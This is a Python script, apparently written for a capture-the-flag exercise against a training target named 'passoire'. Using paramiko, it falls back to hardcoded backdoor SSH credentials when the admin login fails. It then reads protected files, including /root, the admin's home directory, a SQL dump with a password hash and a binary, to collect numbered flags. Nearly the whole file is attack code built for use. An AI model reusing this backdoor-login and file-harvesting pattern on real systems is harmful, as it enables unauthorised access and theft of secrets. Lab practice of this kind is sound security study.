from sys import flags

import paramiko

def ssh_backdoor():
    print("\033[1;32mTrying to get flags using SSH backdoor...\033[0m")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    flags = {}
    
    try:
        ssh.connect('localhost', port=10022, username='admin', password='98765432')
    except Exception as e:
        if "Authentication failed" in str(e):
            print("\033[1;31mUser 'Admin' Authentication failed, trying backdoor...\033[0m")
            try:
                ssh.connect('localhost', port=10022, username='a', password='Backdoor')
            except Exception as e:
                if "Authentication failed" in str(e):
                    print("\033[1;31mBackdoor Authentication failed, stop attacking with SSH\033[0m")
                    return {}

    ssh.exec_command("cd /; ls")
    
    # ============================
    # Flag 1
    # ============================
    stdin, stdout, stderr = ssh.exec_command("cat /home/passoire/flag_1")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 2 Permission denied\033[0m")
    else:
        flags['flag_1'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 1: {flags['flag_1']}")

    # ============================
    # Flag 2
    # ============================
    stdin, stdout, stderr = ssh.exec_command("cat /root/flag_2")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 2 Permission denied\033[0m")
    else:
        flags['flag_2'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 2: {flags['flag_2']}")
        
    # ============================
    # Flag 3
    # ============================
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/web/flag_3")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 3 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 3 not found, might be deleted\033[0m")
    else:
        flags['flag_3'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 3: {flags['flag_3']}")

    # ============================
    # Flag 4
    # ============================
    # Flag 4 in /passoire/web/index.php, line 211~213
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/web/index.php")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    lines = res.split('\n')
    flag_4 = ""
    for line in lines:
        if "flag_4" in line:
            flag_4 = line.strip().split(" ")[-1].replace(".", "")
            break
    if flag_4:
        flags['flag_4'] = flag_4
        print(f"Flag 4: {flags['flag_4']}")
    else:
        print("\033[1;31mFlag 4 not found, might be deleted\033[0m")
        
    # ============================
    # Flag 5
    # ============================
    # flag 5 in /passoire/config/passoire.sql, (3, 'flag_5', 'see-password-hash@that-is-the-fl.ag', 'c364a9d64fda66da9f8b7f9ac1fa672171780d06')
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/config/passoire.sql")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 5 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 5 not found, might be deleted\033[0m")
    else:
        lines = res.split('\n')
        flag_5 = ""
        for line in lines:
            if "flag_5" in line:
                flag_5 = line.strip().split("'")[-2]
                break
        if flag_5:
            flags['flag_5'] = flag_5
            print(f"Flag 5: {flags['flag_5']}")
    
    # ============================
    # Flag 6
    # ============================
    # flag 6 in /passoire/web/uploads/flag_6
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/web/uploads/flag_6")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 6 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 6 not found, might be deleted\033[0m")
    else:
        flags['flag_6'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 6: {flags['flag_6']}")
        
    # ============================
    # Flag 7
    # ============================
    # flag 7 in /passoire/web/uploads/secret
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/web/uploads/secret")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 7 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 7 not found, might be deleted\033[0m")
    else:
        flags['flag_7'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 7: {flags['flag_7']}")
        
    # ============================
    # Flag 8
    # ============================
    # TODO
    print("\033[1;31mFlag 8: TODO\033[0m")
    
    # ============================
    # Flag 9
    # ============================
    # in /passoire/crypto-helper/flag_9
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/crypto-helper/flag_9")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 9 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 9 not found, might be deleted\033[0m")
    else:
        flags['flag_9'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 9: {flags['flag_9']}")
        
    # ============================
    # Flag 10
    # ============================
    # in /passoire/crypto-helper/server.js
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/crypto-helper/server.js")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    lines = res.split('\n')
    flag_10 = ""
    for line in lines:
        if "flag_10" in line:
            flag_10 = line.strip().split(" ")[-2].replace(".", "").replace("\"", "")
            break
    if flag_10:
        flags['flag_10'] = flag_10
        print(f"Flag 10: {flags['flag_10']}")
    else:
        print("\033[1;31mFlag 10 not found, might be deleted\033[0m")
    
    # ============================
    # Flag 11
    # ============================
    # in /passoire/my_own_cryptographic_algorithm, binary, byte 35779 of 73915, hex seg 0x20f0 ~ 0x2180
    stdin, stdout, stderr = ssh.exec_command("xxd -p /passoire/my_own_cryptographic_algorithm")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="ascii")
    res = hex_to_unicode(res[int(0x2180)*2+19:int(0x2180)*2+100])
    flags['flag_11'] = res
    print(f"Flag 11: {flags['flag_11']}")
    
    # ============================
    # Flag 12
    # ============================
    print("\033[1;31mFlag 12 is not exist, it's a trap\033[0m")
    
    # ============================
    # Flag 13
    # ============================
    # in /passoire/web/index.php
    stdin, stdout, stderr = ssh.exec_command("cat /passoire/web/index.php")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    lines = res.split('\n')
    flag_13 = ""
    for line in lines:
        if "flag_13" in line:
            flag_13 = line.strip().split(" ")[-1].replace(".", "")
            break
    if flag_13:
        flags['flag_13'] = flag_13
        print(f"Flag 13: {flags['flag_13']}")
    else:
        print("\033[1;31mFlag 13 not found, might be deleted\033[0m")
    
    # ============================
    # Flag 14
    # ============================
    # in /home/admin/flag_14
    stdin, stdout, stderr = ssh.exec_command("cat /home/admin/flag_14")
    res, err = stdout.read(), stderr.read()
    result = res if res else err
    res = result.decode(encoding="utf-8")
    if "Permission denied" in res:
        print("\033[1;31mFlag 14 Permission denied\033[0m")
    elif "No such file or directory" in res:
        print("\033[1;31mFlag 14 not found, might be deleted\033[0m")
    else:
        flags['flag_14'] = res.split('\n')[0].split(" ")[-1].replace(".", "")
        print(f"Flag 14: {flags['flag_14']}")
    
    ssh.close()
    return flags

def hex_to_unicode(hex_string):
    byte_data = bytes.fromhex(hex_string)
    unicode_string = byte_data.decode('utf-8', errors='replace')  # 'replace' 会替换非法字符为 '?'
    return unicode_string

if __name__ == '__main__':
    flags = ssh_backdoor()
    #print(flags)